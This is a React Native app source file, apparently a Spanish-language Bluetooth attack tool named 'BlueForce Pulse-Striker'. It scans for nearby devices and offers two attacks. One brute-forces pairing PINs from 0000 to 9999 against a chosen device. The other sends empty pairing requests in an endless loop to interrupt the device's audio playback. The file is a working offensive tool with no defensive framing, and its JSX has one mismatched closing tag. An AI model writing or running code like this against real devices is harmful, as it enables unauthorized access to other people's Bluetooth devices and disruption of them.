import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [disruptCount, setDisruptCount] = useState(0);
  const [logs, setLogs] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [aliases, setAliases] = useState({});

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 30));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        ]);
        addLog("🛡️ Motor BlueForce v17 LISTO.");
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning) return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
    } catch (e) { addLog("❌ Error de radio."); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('ATAQUE_PIN');
    addLog(`🚀 Lanzando PINs contra ${device.address}`);
    await RNBluetoothClassic.cancelDiscovery();

    for (let i = 0; i <= 9999; i++) {
      let m; setMode(v => { m = v; return v; }); if (m !== 'ATAQUE_PIN') break;
      
      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      
      try {
        // Intento directo y rápido
        await RNBluetoothClassic.pairDevice(device.address, { pin });
        // Verificación rápida cada 10
        if (i % 10 === 0) {
          const bonded = await RNBluetoothClassic.getBondedDevices();
          if (bonded.some(d => d.address === device.address)) {
            setMode('IDLE'); Alert.alert("¡CONQUISTADO!", "PIN: " + pin); return;
          }
        }
      } catch (e) {
         // Espera técnica mínima para no quemar el chip
         await new Promise(r => setTimeout(r, 400));
      }
    }
    setMode('IDLE');
  };

  const startDisruptor = async (device) => {
    setMode('BLOQUEO');
    setDisruptCount(0);
    addLog(`🔥 INTERRUMPIENDO MÚSICA...`);
    await RNBluetoothClassic.cancelDiscovery();

    let count = 0;
    while (true) {
      let m; setMode(v => { m = v; return v; }); if (m !== 'BLOQUEO') break;
      
      count++;
      setDisruptCount(count);

      try {
        // TÁCTICA DE IMPACTO: Forzar diálogo de seguridad
        // Enviar petición de vínculo vacía obliga al parlante a pausar la música
        RNBluetoothClassic.pairDevice(device.address, {}); 
        await new Promise(r => setTimeout(r, 150)); // Pulso ultra rápido
      } catch (e) {}
    }
    setMode('IDLE');
  };

  return (
    <View style={styles.container}>
      <Text style={styles.header}>BlueForce Pulse-Striker v17</Text>
      
      <View style={[styles.hud, mode !== 'IDLE' && { borderColor: '#ff0033', borderWidth: 2 }]}>
        <Text style={styles.hudMode}>MODO: {mode}</Text>
        <Text style={styles.hudMain}>
          {mode === 'ATAQUE_PIN' ? currentPin : mode === 'BLOQUEO' ? `IMPACTOS: ${disruptCount}` : 'LISTO'}
        </Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.btnText}>ESCANEAR</Text>}
        </TouchableOpacity>
      </View>

      <FlatList data={discoveredDevices} renderItem={({ item }) => (
        <View style={styles.card}>
          <View style={{ flex: 1 }}>
            <Text style={styles.name}>{item.name || "N/A"}</Text>
            <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
          </View>
          <View style={{ flexDirection: 'row' }}>
            <TouchableOpacity style={styles.atkBtn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
              <Text style={styles.btText}>PIN</Text>
            </TouchableOpacity>
            <TouchableOpacity style={[styles.atkBtn, {backgroundColor: '#ff0033', marginLeft: 6}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}>
              <Text style={styles.btText}>!BUG</Text>
            </TouchableOpacity>
          </View>
        </View>
      )} />

      <View style={styles.logBox}>
        {logs.map((l, i) => <Text key={i} style={styles.logItem}>{l}</Text>)}
      </ScrollView>

      {mode !== 'IDLE' && (
        <TouchableOpacity style={styles.stopBtn} onPress={() => setMode('IDLE')}>
          <Text style={{color:'#fff', fontWeight:'bold'}}>DETENER ATAQUE</Text>
        </TouchableOpacity>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  header: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  hud: { backgroundColor: '#111', padding: 20, borderRadius: 20, marginBottom: 15 },
  hudMode: { color: '#444', fontSize: 10, textAlign: 'center', marginBottom: 5 },
  hudMain: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 15, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 12, alignItems: 'center' },
  btnText: { fontWeight: 'bold', color: '#000' },
  card: { backgroundColor: '#151a22', padding: 15, borderRadius: 12, marginBottom: 8, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#555', fontSize: 9 },
  atkBtn: { backgroundColor: '#222', padding: 12, borderRadius: 10 },
  btText: { color: '#fff', fontWeight: 'bold', fontSize: 10 },
  logBox: { height: 80, backgroundColor: '#050505', padding: 10, borderRadius: 10, marginTop: 10 },
  logItem: { color: '#333', fontSize: 8, marginBottom: 2 },
  stopBtn: { backgroundColor: '#ff0033', padding: 18, borderRadius: 15, alignItems: 'center', marginTop: 10 }
});
